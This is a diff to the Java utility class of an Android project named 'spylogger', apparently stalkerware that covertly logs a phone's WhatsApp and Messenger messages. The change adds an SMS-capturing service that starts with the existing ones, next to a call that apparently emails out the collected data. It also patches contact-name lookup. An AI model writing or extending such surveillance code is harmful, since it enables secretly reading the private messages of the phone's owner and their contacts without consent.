@@ -33,6 +33,7 @@ import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookPrefs;
 import com.gravatasufoca.spylogger.model.messenger.Contact;
 import com.gravatasufoca.spylogger.model.messenger.Prefs;
 import com.gravatasufoca.spylogger.model.Configuracao;
+import com.gravatasufoca.spylogger.services.SmsService;
 import com.gravatasufoca.spylogger.services.WhatsAppService;
 import com.gravatasufoca.spylogger.helpers.WhatsHtmlHelper;
 import com.gravatasufoca.spylogger.R;
@@ -88,6 +89,7 @@ public class Utils {
 	public static String COMPRADO="potoca";
 
 	public static Context context;
+	public static FileObserver observer;
 
 	public static String getDeviceId(ContentResolver contentResolver){
 		String deviceId = Secure.getString(contentResolver,Secure.ANDROID_ID);
@@ -210,17 +212,22 @@ public class Utils {
 			String nome = contactLookup.getString(contactLookup
 					.getColumnIndex(ContactsContract.Data.DISPLAY_NAME));
 			return nome;
-		}finally {
+		}catch(Exception e){
+			return null;
+		}
+		finally {
 			contactLookup.close();
-			return "";
 		}
 	}
 
 	public static String getContactDisplayNameByNumber(String number,
 			ContentResolver contentResolver) {
 		if(number ==null || number.isEmpty()) return "";
-		Cursor contact = getContact(number.substring(0,number.indexOf("@")), contentResolver);
-		return getContactDisplayNameByNumber(contact);
+		int indice=number.indexOf("@");
+
+		Cursor contact = getContact(number.substring(0,indice!=-1?indice:number.length()), contentResolver);
+		String nome= getContactDisplayNameByNumber(contact);
+		return nome!=null?nome:number;
 	}
 
 	public static Uri getPhotoUri(long contactId,
@@ -593,7 +600,9 @@ public class Utils {
 	}
 
 	public static boolean isServiceRunning(Context context){
-		return Utilidades.isServiceRunning(WhatsAppService.class,context) && Utilidades.isServiceRunning(MessengerService.class,context);
+		return Utilidades.isServiceRunning(WhatsAppService.class,context)
+				&& Utilidades.isServiceRunning(MessengerService.class,context)
+				&& Utilidades.isServiceRunning(SmsService.class,context);
 	}
 
 	public static String getPercentualMensagem(String mensagem, int percentual){
@@ -608,6 +617,7 @@ public class Utils {
 		if(!Utils.isServiceRunning(context)){
 			context.startService(new Intent(context, WhatsAppService.class));
 			context.startService(new Intent(context, MessengerService.class));
+			context.startService(new Intent(context, SmsService.class));
 		}
 		Utils.startMail(context);
 		Toast.makeText(context, context.getString(R.string.service_running), Toast.LENGTH_LONG).show();
